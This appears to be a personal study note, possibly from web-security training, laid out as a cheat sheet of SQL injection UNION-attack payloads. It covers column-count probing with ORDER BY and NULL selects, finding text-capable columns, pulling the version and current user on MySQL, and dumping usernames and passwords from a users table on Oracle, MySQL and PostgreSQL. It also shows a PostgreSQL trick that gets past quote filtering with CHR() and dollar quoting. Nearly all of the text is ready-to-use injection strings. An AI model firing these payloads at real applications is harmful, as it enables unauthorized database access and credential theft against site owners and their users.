## Determining the number of columns required for the union:
```
' ORDER BY 1--  
' ORDER BY 2--  
' ORDER BY 3--
```

or:

```
' UNION SELECT NULL--  
' UNION SELECT NULL,NULL--  
' UNION SELECT NULL,NULL,NULL--
```

**   On #Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `DUAL` which can be used for this purpose. So the injected queries on Oracle would need to look like: `' UNION SELECT NULL FROM DUAL--`. **


## Finding columns with a useful data type in an SQL injection UNION attack
```
' UNION SELECT 'a',NULL,NULL,NULL--  
' UNION SELECT NULL,'a',NULL,NULL--  
' UNION SELECT NULL,NULL,'a',NULL--  
' UNION SELECT NULL,NULL,NULL,'a'--
```


Once determined the types of columns:
```union all select 1,2,3,4,5,6```
To see where in the screen each column is being displayed

 
Extracting the data based on this:
#MySQL 
```union all select 1,2,3,4,@@version,6```

 
#MySQL
To know what user is being used for the DB
```union all select 1,2,3,4,user(),6```


 ## Extracting information
 
```' UNION SELECT username, password FROM users--```

For example:
```%27+union+SELECT+NULL,USERNAME_CEXQAE||%27:%27||PASSWORD_WBPTGO+FROM+USERS_KPOKHJ+--+```




## Retrieving multiple values in one column
#Oracle 
```' UNION SELECT username || '~' || password FROM users--```

#MySQL 
```union select 1,2,3,4,concat(name,0x3a, password),6 FROM users```
* Note that '0x3a' is the ASCII value of ":"

#Postgresql 
Bypassing quote restrictions: ```CHR(65)```
or using `$` or `$$`
```
SELECT 'AWAE';  
SELECT $$AWAE$$; SELECT $TAG$AWAE$TAG$;
```
String concatenation: ```||```
Character concatenation only works for SELECT, INSERT, DELETE
```INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69))```




## Perform DB recon
[[Database_Recon]]

